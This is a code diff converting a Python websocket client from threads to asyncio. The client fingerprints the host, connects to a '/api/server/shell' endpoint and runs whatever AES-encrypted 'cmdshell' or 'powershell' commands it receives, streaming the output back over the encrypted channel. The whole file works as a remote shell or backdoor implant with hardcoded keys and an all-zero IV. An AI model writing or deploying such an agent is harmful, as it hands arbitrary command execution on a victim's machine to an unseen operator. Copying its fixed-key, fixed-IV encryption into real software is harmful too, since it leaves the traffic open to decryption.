@@ -1,19 +1,20 @@
 from tiny_aes import AES, pad, unpad
 from platform_xmrt import xmplatform
-import websocket
+import websockets
 import json
-import threading
+import asyncio
 import subprocess
 
 system_info = xmplatform()
 tyaes = AES()
 
 URL = "ws://localhost:8000/api/server/shell"
+COMMAND_SEMAPHORE = asyncio.Semaphore(10)
+IV = b'\x00' * 16
 HEADER = {
     "FRS": f"From {system_info.get('system')}{system_info.get('release')} {system_info.get('version')} On {system_info.get('machine')}",
     "FRSNode": system_info.get('node')
 }
-IV = b'\x00' * 16
 AES_KEY = [
     b'O\xca\xfd\x1f[\xaa=\x1a\xa4\x80\xc4}$q[p',
     b'\x92Z7\x11\x81m\xac5r[k\x13)\xf1V\t',
@@ -30,13 +31,14 @@ AES_KEY = [
     b'\x17[6\xb2b=\xfdQ\x13\r\x01\xc7qK}J'
 ]
 
+
 def get_message(message_hex):
     ciphertext_bytes = bytes.fromhex(message_hex)
     decrypted = tyaes.aes_decrypt_cbc(ciphertext_bytes, AES_KEY, IV)
     unpadded = unpad(decrypted)
     return unpadded.decode('utf-8')
 
-def send_message(ws, type: str, data: str, debug: str):
+async def send_message(ws, type: str, data: str, debug: str):
     message_json = {
         "type": type,
         "data": data,
@@ -45,90 +47,90 @@ def send_message(ws, type: str, data: str, debug: str):
     plaintext_bytes = json.dumps(message_json).encode('utf-8')
     padded = pad(plaintext_bytes)
     ciphertext = tyaes.aes_encrypt_cbc(padded, AES_KEY, IV)
-    ws.send(ciphertext.hex())
+    await ws.send(ciphertext.hex())
 
-def handle_message(ws, message):
-    try:
-        decrypted_message = get_message(message)
-        message_data = json.loads(decrypted_message)
-        if message_data.get("type") == "cmdshell":
-            run_command(ws, message_data)
-        else:
-            print("Received:", decrypted_message)
-    except Exception as e:
-        print("Failed to decrypt message:", str(e))
-
-def run_command(ws, message_data):
+async def run_command(ws, message_data, powershell=False):
     command = message_data.get("data")
     path = message_data.get("path", "C:\\Windows\\System32")
-    timestamp = message_data.get("timestamp")
     if not command or not path:
         error_message = "Invalid command or path"
         print(error_message)
-        send_message(ws, type="return", data=error_message, debug="")  # 发送错误信息
-        send_message(ws, type="return", data="$$$end$$$", debug="")  # 添加结束标记
+        await send_message(ws, type="return_sys", data="$$$error$$$", debug=error_message)
+        await send_message(ws, type="return_sys", data="$$$end$$$", debug="")
         return
-    send_message(ws, type="return", data="$$$start$$$", debug="")
-    
+    await send_message(ws, type="return", data="$$$start$$$", debug="")
     try:
-        process = subprocess.Popen(
-            command,
-            shell=True,
+        if powershell:
+            full_command = f"powershell.exe -Command {command}"
+        else:
+            full_command = command
+
+        process = await asyncio.create_subprocess_shell(
+            full_command,
             cwd=path,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            text=True,
-            bufsize=1,
-            universal_newlines=True
+            text=False,
+            bufsize=0
         )
-        
-        while True:
-            output = process.stdout.readline()  # type: ignore
-            if output == '' and process.poll() is not None:
-                break
-            if output:
-                send_message(ws, type="return", data=output, debug="")
-        
-        stderr = process.stderr.read()  # type: ignore
-        if stderr:
-            send_message(ws, type="return", data=stderr, debug="")
-        
-        # 发送结束标记
-        send_message(ws, type="return", data="$$$end$$$", debug="")
-
+        async def read_stream(stream, type):
+            try:
+                while True:
+                    output = await stream.readline()
+                    if output == b'':
+                        break
+                    output_str = output.decode('gbk', errors='replace').rstrip()
+                    await send_message(ws, type=type, data=output_str, debug="cmdshell")
+            except asyncio.CancelledError:
+                pass
+        try:
+            await asyncio.wait_for(
+                asyncio.gather(
+                    read_stream(process.stdout, "return"),
+                    read_stream(process.stderr, "return")
+                ),
+                timeout=300
+            )
+        except asyncio.TimeoutError:
+            print("Command execution timed out")
+            process.terminate()
+            await process.wait()
+        await send_message(ws, type="return_sys", data="$$$end$$$", debug="")
     except Exception as e:
-        error_message = f"Error: {str(e)}"
+        error_message = str(e)
         print(error_message)
-        send_message(ws, type="return", data=error_message, debug="")  # 发送错误信息
-        send_message(ws, type="return", data="$$$end$$$", debug="")  # 添加结束标记
+        await send_message(ws, type="return_sys", data="$$$error$$$", debug=error_message)
+        await send_message(ws, type="return", data="$$$end$$$", debug="")
 
-def on_message(ws, message):
-    handle_message(ws, message)
+async def handle_message(ws, message):
+    try:
+        decrypted_message = get_message(message)
+        message_data = json.loads(decrypted_message)
+        
+        async def process_command():
+            async with COMMAND_SEMAPHORE:
+                if message_data.get("type") == "cmdshell":
+                    await run_command(ws, message_data, False)
+                elif message_data.get("type") == "powershell":
+                    await run_command(ws, message_data, True)
+                else:
+                    pass
+        asyncio.create_task(process_command())
+    except Exception as e:
+        print("Failed to decrypt message:", str(e))
 
-def on_error(ws, error):
-    print("Error:", str(error))
-
-def on_close(ws, close_status_code, close_msg):
-    print("Connection closed")
-
-def input_handler(ws):
+async def input_handler(ws):
+    loop = asyncio.get_event_loop()
     while True:
-        msg = input()
-        send_message(ws, type="chat", data=msg, debug="")
+        msg = await loop.run_in_executor(None, input)
+        await send_message(ws, type="chat", data=msg, debug="")
 
-def on_open(ws):
-    print("Connection opened")
-    send_message(ws, type="init", data="Client initialized", debug="")
-    threading.Thread(target=input_handler, args=(ws,), daemon=True).start()
+async def client():
+    async with websockets.connect(URL, extra_headers=HEADER) as ws:
+        await send_message(ws, type="init", data="Client initialized", debug="")
+        asyncio.create_task(input_handler(ws))
+        async for message in ws:
+            await handle_message(ws, message)
 
 if __name__ == "__main__":
-    websocket.enableTrace(True)
-    ws = websocket.WebSocketApp(
-        URL,
-        on_message=on_message,
-        on_error=on_error,
-        on_close=on_close,
-        header=[f"{k}: {v}" for k, v in HEADER.items()]
-    )
-    ws.on_open = on_open
-    ws.run_forever(ping_interval=None) # type: ignore
+    asyncio.run(client())
